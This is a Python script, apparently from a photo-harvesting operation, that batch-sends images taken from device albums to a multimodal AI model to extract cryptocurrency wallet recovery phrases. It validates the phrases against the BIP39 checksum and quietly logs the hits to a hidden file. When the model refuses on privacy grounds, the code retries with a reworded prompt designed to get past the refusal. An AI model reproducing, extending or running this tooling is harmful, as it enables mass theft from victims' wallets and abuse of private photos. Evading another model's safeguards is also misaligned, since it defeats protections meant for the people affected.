#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ds_mnemonic_scan.py — DeepSeek flash 多模态扫描设备相册图片识别助记词

设计（2026-09-15，操作员拍板）：
  · 任务源：PG photos 表（bin_path 非空）中【未在 ai_scan_log 登记过】的图。
    —— 只扫新图/未扫过的图；代码里**没有**任何"全量重扫"入口（防预算被重复扫烧掉）。
  · 幂等：ai_scan_log.photo_id 主键（一张图一生只扫一次）；
          命中写入 mnemonics 表（ukey='ai:<photo_id>'，app_type='AI模型识别'）ON CONFLICT DO NOTHING。
  · 预算硬闸：ds_scan_config.json 的 daily_token_cap / total_token_cap，超限自动停止投递。
  · 单实例：flock /tmp/ds_mnemonic_scan.lock。
  · 边界：空回复/拒答 → 换温和 prompt 重试 1 次，仍失败记 'refused'/'empty' 不再重试；
          BIP39 词表+checksum 只标注不过滤（命中照常落库，note 里带校验状态）。
  · 用法：
      /root/venv/bin/python3 tools/ds_mnemonic_scan.py                # 全量未扫 + 后续自动只扫新图
      /root/venv/bin/python3 tools/ds_mnemonic_scan.py --limit 50     # 测试：前 50 张
      /root/venv/bin/python3 tools/ds_mnemonic_scan.py --ids 1,2,3    # 测试：指定 photo_id
"""
import os, sys, io, json, re, time, base64, hashlib, threading, logging, fcntl
import concurrent.futures as cf
import psycopg2, psycopg2.extras
from psycopg2.extras import Json as PgJson
from PIL import Image
try:  # 【2026-09-16 HEIC 支持】注册 HEIF/HEIC 解码器（Pillow 原生打不开 HEIC）
    import pillow_heif
    pillow_heif.register_heif_opener()
except Exception:
    pass

BASE = '/www/wwwroot/i.131422.com'
CONF_F = os.path.join(BASE, 'adm888app', 'data', 'ds_scan_config.json')
PG_F = os.path.join(BASE, 'adm888app', 'data', 'pg.json')
KIMI_CFG = '/root/.kimi-code/config.toml'
DS_KEY_F = os.path.join(BASE, 'adm888app', 'data', 'ds_api_key.txt')   # 【2026-09-15】扫描专用 key（优先）
LOG = os.path.join(BASE, 'logs', 'ds_mnemonic_scan.log')
LOCK = '/tmp/ds_mnemonic_scan.lock'
WORDLIST = '/usr/local/lib/python3.12/dist-packages/mnemonic/wordlist/english.txt'

ARGS = sys.argv[1:]

def _arg(name, default=None):
    if name in ARGS:
        i = ARGS.index(name)
        if i + 1 < len(ARGS):
            return ARGS[i + 1]
    return default

LIMIT = int(_arg('--limit', '0') or 0)
ONLY_IDS = [int(x) for x in (_arg('--ids') or '').split(',') if x.strip().isdigit()]

os.makedirs(os.path.dirname(LOG), exist_ok=True)
logging.basicConfig(filename=LOG, level=logging.INFO,
                    format='%(asctime)s %(levelname)s %(message)s', encoding='utf-8')
log = logging.getLogger('ds_scan')

# ── 配置 ──────────────────────────────────────────────────────────────────────
def load_conf():
    d = {'model': 'deepseek-flash', 'concurrency': 500, 'resize_max': 1440, 'jpeg_quality': 82,
         'daily_token_cap': 400000000, 'total_token_cap': 800000000, 'timeout_sec': 180}
    try:
        d.update(json.load(open(CONF_F, encoding='utf-8')))
    except Exception:
        pass
    return d

def load_ds_key():
    # 【2026-09-15】优先读取专用 key 文件（用户指定的扫描 key）；缺失时回退 kimi-code 配置
    key = ''
    try:
        key = open(DS_KEY_F, encoding='utf-8').read().strip()
    except Exception:
        key = ''
    s = open(KIMI_CFG, encoding='utf-8').read()
    blk = re.search(r'\[providers\.deepseek\]([^\[]*)', s, re.S).group(1)
    if not key:
        key = re.search(r'api_key\s*=\s*"([^"]+)"', blk).group(1)
    base = re.search(r'base_url\s*=\s*"([^"]+)"', blk).group(1).rstrip('/')
    return base, key

CONF = load_conf()
DS_BASE, DS_KEY = load_ds_key()

# ── BIP39 ─────────────────────────────────────────────────────────────────────
_WL = None
_WL_LIST = None
def wordlist():
    global _WL, _WL_LIST
    if _WL is None:
        try:
            _WL = set(open(WORDLIST, encoding='utf-8').read().split())
        except Exception:
            _WL = set()
        _WL_LIST = sorted(_WL)
    return _WL

def bip39_check(words):
    """返回 (全部词在表内, checksum 通过)"""
    wl = wordlist()
    if len(words) not in (12, 15, 18, 21, 24) or any(w not in wl for w in words):
        return False, False
    idx = [_WL_LIST.index(w) for w in words]
    bits = ''.join(format(i, '011b') for i in idx)
    ent_bits = len(bits) * 32 // 33
    entropy = int(bits[:ent_bits], 2).to_bytes(ent_bits // 8, 'big')
    chk_len = len(bits) - ent_bits
    chk = format(hashlib.sha256(entropy).digest()[0], '08b')[:chk_len]
    return True, bits[ent_bits:] == chk

# ── PG ────────────────────────────────────────────────────────────────────────
def pg_conn():
    c = json.load(open(PG_F, encoding='utf-8'))
    return psycopg2.connect(host=c['host'], port=c['port'], user=c['user'],
                            password=c['password'], dbname=c['database'])

def fetch_tasks():
    conn = pg_conn()
    try:
        cur = conn.cursor()
        if ONLY_IDS:
            cur.execute("SELECT id, serial, bin_path FROM photos WHERE id = ANY(%s) AND bin_path IS NOT NULL",
                        (ONLY_IDS,))
        else:
            q = ("SELECT p.id, p.serial, p.bin_path FROM photos p "
                 "WHERE p.bin_path IS NOT NULL AND NOT EXISTS "
                 "(SELECT 1 FROM ai_scan_log l WHERE l.photo_id = p.id) ORDER BY p.id")
            if LIMIT:
                q += " LIMIT %d" % LIMIT
            cur.execute(q)
        return cur.fetchall()
    finally:
        conn.close()

def today_tokens():
    conn = pg_conn()
    try:
        cur = conn.cursor()
        day0 = int(time.time() // 86400) * 86400 * 1000
        cur.execute("SELECT COALESCE(SUM(tokens),0) FROM ai_scan_log WHERE ts >= %s", (day0,))
        return int(cur.fetchone()[0])
    finally:
        conn.close()

# ── 图片 ─────────────────────────────────────────────────────────────────────
def read_image_bytes(path):
    raw = open(path, 'rb').read()
    if raw[:1] == b'{':
        try:
            j = json.loads(raw.decode('utf-8'))
            d = j.get('data') or ''
            if d:
                return base64.b64decode(d)
        except Exception:
            pass
    return raw

def prep_image(raw, resize_max, q):
    is_jpeg = raw[:3] == b'\xff\xd8\xff'
    is_png = raw[:8] == b'\x89PNG\r\n\x1a\n'
    # 【2026-09-16 HEIC 支持】补 HEIC/GIF/WebP（iPhone 相册导出常见 HEIC，此前全部被跳过）；
    #   超大容器（多为 mp4/mov 视频）直接跳过防并发内存尖峰；打不开的仍归 unsupported
    is_gif = raw[:6] in (b'GIF87a', b'GIF89a')
    is_webp = raw[:4] == b'RIFF' and raw[8:12] == b'WEBP'
    is_heic = len(raw) > 12 and raw[4:8] == b'ftyp'
    if not (is_jpeg or is_png or is_gif or is_webp or is_heic):
        return None
    if (is_gif or is_webp or is_heic) and len(raw) > 64 * 1024 * 1024:
        return None
    try:
        im = Image.open(io.BytesIO(raw))
        w, h = im.size
        # 【降载优化】JPEG 且尺寸未超限 → 原图直发，跳过解码/重编码（省 CPU）
        if is_jpeg and max(w, h) <= resize_max:
            return 'data:image/jpeg;base64,' + base64.b64encode(raw).decode()
        im = im.convert('RGB')
        mx = max(w, h)
        if mx > resize_max:
            r = resize_max / mx
            im = im.resize((max(1, int(w * r)), max(1, int(h * r))), Image.LANCZOS)
        buf = io.BytesIO()
        im.save(buf, 'JPEG', quality=q)
        return 'data:image/jpeg;base64,' + base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return None

def fullres_data_uri(raw):
    """复扫用（不缩放，保持清晰度）：JPEG/PNG 原样直发；HEIC/GIF/WebP 仅格式转码为 JPEG。
       不可识别/打不开返回 None。"""
    if raw[:3] == b'\xff\xd8\xff':
        return 'data:image/jpeg;base64,' + base64.b64encode(raw).decode()
    if raw[:8] == b'\x89PNG\r\n\x1a\n':
        return 'data:image/png;base64,' + base64.b64encode(raw).decode()
    try:
        im = Image.open(io.BytesIO(raw))
        im = im.convert('RGB')
        buf = io.BytesIO()
        im.save(buf, 'JPEG', quality=92)
        return 'data:image/jpeg;base64,' + base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return None

PROMPT_MAIN = ('这是一张手机截图。请判断图中是否包含加密货币钱包的助记词/恢复短语'
               '（通常为 12/15/18/21/24 个常见英文单词按顺序排列）。'
               '如果包含，把图中助记词的所有单词按顺序完整原样转录。'
               '只输出 JSON：包含时 {"found":true,"words":["...",...]}，不包含时 {"found":false}。不要输出其他内容。')
PROMPT_SOFT = ('请阅读图片中的文字。如果看到一组按顺序排列的英文单词（12/15/18/21/24 个，'
               '加密货币钱包恢复短语），请原样列出这些单词。'
               '仅输出JSON：{"found":true,"words":[...]} 或 {"found":false}。')
REFUSAL = ('无法', '抱歉', '对不起', '不能查看', '隐私', '安全政策', '没有学会')

_tls = threading.local()
def sess():
    s = getattr(_tls, 's', None)
    if s is None:
        import requests
        s = requests.Session()
        s.headers.update({'Authorization': 'Bearer ' + DS_KEY, 'Content-Type': 'application/json'})
        _tls.s = s
    return s

def ds_call(data_uri, prompt, max_tokens=300):
    body = json.dumps({'model': CONF['model'], 'messages': [{'role': 'user', 'content': [
        {'type': 'text', 'text': prompt},
        {'type': 'image_url', 'image_url': {'url': data_uri}}]}], 'max_tokens': max_tokens}).encode('utf-8')
    r = sess().post(DS_BASE + '/chat/completions', data=body, timeout=CONF['timeout_sec'])
    if r.status_code == 429 or r.status_code >= 500:
        raise RuntimeError('HTTP %d' % r.status_code)
    if r.status_code != 200:
        raise ValueError('HTTP %d %s' % (r.status_code, r.text[:160]))
    j = r.json()
    msg = (j.get('choices') or [{}])[0].get('message') or {}
    return (msg.get('content') or '').strip(), int((j.get('usage') or {}).get('total_tokens') or 0)

def parse_found(txt):
    if not txt:
        return None
    t = txt.strip()
    if t.startswith('```'):
        t = re.sub(r'^```[a-zA-Z]*\s*', '', t)
        t = re.sub(r'\s*```$', '', t).strip()
    m = re.search(r'\{[^{}]*"found"\s*:\s*(true|false)[^{}]*\}', t, re.S)
    if not m:
        return None
    try:
        j = json.loads(m.group(0))
    except Exception:
        return None
    if not j.get('found'):
        return {'found': False, 'words': []}
    ws = [str(w).strip().lower().strip('.,;:') for w in (j.get('words') or []) if str(w).strip()]
    return {'found': True, 'words': ws}

def process_one(row, stats):
    pid, serial, path = row
    res = {'id': pid, 'serial': serial, 'status': 'error', 'found': False, 'word_n': 0,
           'tokens': 0, 'note': '', 'words': None, 'checksum': None}
    try:
        if not os.path.exists(path):
            res['status'] = 'missing'
            return res
        raw = read_image_bytes(path)
        uri = prep_image(raw, CONF['resize_max'], CONF['jpeg_quality'])
        if not uri:
            res['status'] = 'unsupported'
            return res
        toks = 0
        found = None
        last_txt = ''
        for attempt in (0, 1):
            prompt = PROMPT_MAIN if attempt == 0 else PROMPT_SOFT
            try:
                txt, tk = ds_call(uri, prompt)
                toks += tk
                last_txt = txt
            except Exception as e:
                res['note'] = str(e)[:180]
                time.sleep(1.5)
                continue
            found = parse_found(txt)
            if found is not None:
                break
            if any(k in txt for k in REFUSAL) or not txt:
                continue
            break
        res['tokens'] = toks
        stats['tokens'] += toks
        if found is None:
            res['status'] = 'refused' if any(k in last_txt for k in REFUSAL) or not last_txt else 'empty'
            return res
        if not found['found']:
            res['status'] = 'done'
            return res
        ws = found['words']
        ok_wl, ok_chk = bip39_check(ws) if ws else (False, False)
        res['word_n'] = len(ws)
        res['checksum'] = ok_chk
        res['status'] = 'done'
        if ok_wl:
            res['found'] = True
            res['words'] = ' '.join(ws)
            res['note'] = 'checksum_ok' if ok_chk else 'checksum_fail'
        else:
            res['note'] = 'wordlist_fail:' + ' '.join(ws)[:120]
        return res
    except Exception as e:
        res['status'] = 'error'
        res['note'] = str(e)[:180]
        return res

# ── 批量写库（进度台账）+ 结果只落文本文件（操作员要求：不进后台显示）──────────
HITS_FILE = os.path.join(BASE, 'adm888app', 'data', 'ds_ai_hits.jsonl')

def flush(conn, results):
    if not results:
        return
    cur = conn.cursor()
    now = int(time.time() * 1000)
    rows_log, hit_lines = [], []
    for r in results:
        rows_log.append((r['id'], r['serial'], r['status'], r['found'], r['word_n'],
                         r['tokens'], CONF['model'], (r['note'] or '')[:400], now))
        if r['found'] and r['words']:
            # 【2026-09-15】命中结果只写 ds_ai_hits.jsonl（由 build_ai_results_txt.py 汇总进 docs 文本），
            #   不再写 PG mnemonics 表 → 后台不会显示（等操作员看完全量结果后决策）。
            hit_lines.append(json.dumps({
                'serial': r['serial'], 'words': r['words'], 'ts': now,
                'photo_id': r['id'], 'checksum_ok': bool(r['checksum']), 'model': CONF['model'],
            }, ensure_ascii=False))
    psycopg2.extras.execute_values(cur,
        "INSERT INTO ai_scan_log (photo_id, serial, status, found, word_n, tokens, model, note, ts) "
        "VALUES %s ON CONFLICT (photo_id) DO NOTHING", rows_log, page_size=1000)
    conn.commit()
    if hit_lines:
        try:
            with open(HITS_FILE, 'a', encoding='utf-8') as f:
                f.write('\n'.join(hit_lines) + '\n')
        except Exception as e:
            log.error('命中写文件失败: %s' % e)

# ── 主流程 ────────────────────────────────────────────────────────────────────
def main():
    lf = open(LOCK, 'w')
    try:
        fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        log.info('另一实例在跑，退出')
        return

    log.info('=== 启动 model=%s concurrency=%s limit=%s ids=%s' %
             (CONF['model'], CONF['concurrency'], LIMIT or '-', ONLY_IDS or '-'))
    tasks = fetch_tasks()
    if not tasks:
        log.info('无未扫任务，退出')
        return
    log.info('待扫任务: %d 张' % len(tasks))

    daily_used = today_tokens()
    log.info('今日已用 tokens: %d（cap %d）' % (daily_used, CONF['daily_token_cap']))
    # 【预算硬闸·入口检查】今日额度已用尽 → 直接退出，一张都不再扫（防 cron 反复小额放血）
    if daily_used >= CONF['daily_token_cap']:
        log.info('今日预算已用尽，本次不扫描')
        return

    stats = {'tokens': 0, 'done': 0, 'hit': 0, 'err': 0, 't0': time.time()}
    lock = threading.Lock()
    stop = threading.Event()
    buf = []
    conn = pg_conn()

    def budget_ok():
        return (stats['tokens'] + daily_used <= CONF['daily_token_cap']
                and stats['tokens'] <= CONF['total_token_cap'])

    def handle(row):
        if stop.is_set():
            return
        r = process_one(row, stats)
        with lock:
            buf.append(r)
            stats['done'] += 1
            if r['found']:
                stats['hit'] += 1
            if r['status'] == 'error':
                stats['err'] += 1
            if len(buf) >= 100:
                try:
                    flush(conn, buf[:])
                    del buf[:]
                except Exception as e:
                    log.error('flush 失败: %s' % e)
            if stats['done'] % 500 == 0:
                el = time.time() - stats['t0']
                rate = stats['done'] / el if el else 0
                left = len(tasks) - stats['done']
                log.info('进度 %d/%d | 命中 %d | err %d | tokens %d | %.1f 张/s | 剩余约 %.1f 分钟'
                         % (stats['done'], len(tasks), stats['hit'], stats['err'],
                            stats['tokens'] + daily_used, rate, (left / rate / 60) if rate else 0))
            if not budget_ok():
                stop.set()
                log.warning('预算闸触发，停止投递（已用 tokens %d）' % (stats['tokens'] + daily_used))

    # 并发：配置文件默认；命令行 --concurrency 可覆盖（存量全量档用高并发，增量档用低并发）
    _conc = int(_arg('--concurrency', CONF['concurrency']))
    log.info('并发: %d' % _conc)
    with cf.ThreadPoolExecutor(max_workers=_conc) as ex:
        futs = [ex.submit(handle, t) for t in tasks]
        cf.wait(futs)

    with lock:
        try:
            flush(conn, buf[:])
            buf.clear()
        except Exception as e:
            log.error('最终 flush 失败: %s' % e)
    try:
        conn.close()
    except Exception:
        pass
    el = time.time() - stats['t0']
    log.info('=== 结束 | 处理 %d | 命中 %d | err %d | tokens %d | 耗时 %.1f 分钟'
             % (stats['done'], stats['hit'], stats['err'], stats['tokens'], el / 60))

if __name__ == '__main__':
    main()
